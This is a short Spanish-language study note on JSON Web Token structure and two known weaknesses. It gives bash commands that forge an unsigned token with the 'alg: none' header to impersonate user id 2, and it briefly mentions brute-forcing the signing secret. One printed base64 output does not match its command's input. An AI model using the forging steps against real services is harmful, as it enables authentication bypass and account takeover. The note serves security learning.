-- - 

Los JWT estan compuesto por 3 partes:
1. ==El header== ---> Algorith & Token type
2. **El payload** ---> Data
3. *La signature* ---> Verify Signature 
==eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9==.**eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ**.*SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c*

Estos mismos estan hechos en encodeados en base64 por lo que se los puede encodear de decodear en su propia web *jwt.io* o en la misma terminal.

-- -
## Posibles fallas en el uso de los JWT
### Algorithm = None y no ponemos signature
```bash
echo -n '{"alg":"NONE","typ":"JWT"}' | base64
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0= ---> header modificado y encodeado en base64
```

```bash
echo -n '{"id":2,"iat":1724327756,"exp":1724331356}' | base64
eyJpZCI6MiwiaWF0IjoxNzI0MzI3NTA4LCJleHAiOjE3MjQzMzExMDh9
```
Ahora podriamos intentar juntar las 2 cadenas resultantes unidas por un punto para ver si se puede burlar la signatura
```bash 
eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpZCI6MiwiaWF0IjoxNzI0MzI3NzU2LCJleHAiOjE3MjQzMzEzNTZ9. 
```
**Aclaracion:**
Esto funciona ya que al poner **"alg":"NONE"** no hay ningun algoritmo el cual se aplique a la signature por lo que no hace falta poner la ultima cadena, lo cual nos permitiria crear nuestros propios JWT.

**IMPORTANTE:**
Borrar el "=" que te da la primer cadena y agregar un punto al final de las 2 cadenas unidas. 
### Brute Force Attack sobre el secreto
Este otro metodo consiste en descubrir el secreto mediante puras combinaciones hasta que nos tome el JWT como valido. 
No lo considero factible.
